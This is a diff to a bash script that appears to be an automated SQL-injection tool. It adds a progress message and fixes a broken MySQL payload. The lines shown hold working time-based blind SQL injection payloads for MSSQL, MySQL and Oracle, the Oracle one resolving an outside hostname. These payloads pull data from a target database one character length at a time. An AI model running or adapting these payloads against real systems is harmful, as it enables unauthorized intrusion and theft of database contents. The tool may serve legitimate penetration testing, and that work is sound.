@@ -2457,6 +2457,7 @@ fi
 if [[ "$check_flag" == "0" ]] ; then
 echo "Reading in ./payloads/thingstoextractwhenblind.$dbms.txt to get data to extract. You could modify this file to extract other data..."
 cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
+	echo "Trying to extract: $findme"
 	###get the length of the string
 	horiz=40
 	oflag=1
@@ -2703,6 +2704,7 @@ fi
 if [[ "$check_flag" == "0" ]] ; then
 echo "Reading in ./payloads/thingstoextractwhenblind.$dbms.txt to get data to extract. You could modify this file to extract other data..."
 cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
+	echo "Trying to extract: $findme"
 	###get the length of the string
 	horiz=40
 	oflag=1
@@ -2733,7 +2735,7 @@ cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
 		if [[ $dbms == "mssql" ]] ; then                                       
 			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len($findme) = $oflag) waitfor delay '0:0:8'$end"`
 		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then benchmark(10000000,MD5(1)else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then benchmark(10000000,MD5(1)) else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
 		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when length(($findme)) = $oflag then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
 		else
@@ -2905,6 +2907,7 @@ fi
 if [[ "$check_flag" == "0" ]] ; then
 echo "Reading in ./payloads/thingstoextractwhenblind.$dbms.txt to get data to extract. You could modify this file to extract other data..."
 cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
+	echo "Trying to extract: $findme"
 	###get the length of the string
 	horiz=40
 	oflag=1
@@ -2935,7 +2938,7 @@ cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
 		if [[ $dbms == "mssql" ]] ; then                                       
 			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len($findme) = $oflag) waitfor delay '0:0:8'$end"`
 		elif [[ $dbms == "mysql" ]] ; then
-			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then benchmark(10000000,MD5(1)else 0 end)$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length($findme) = $oflag) then benchmark(10000000,MD5(1)) else 0 end)$end"`
 		elif [[ $dbms == "oracle" ]] ; then
 		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/case when length(($findme)) = $oflag then (select (cast (UTL_INADDR.get_host_address('n0where329.z0m') as varchar(20))) from dual) else 'a' end$end"`
 		else
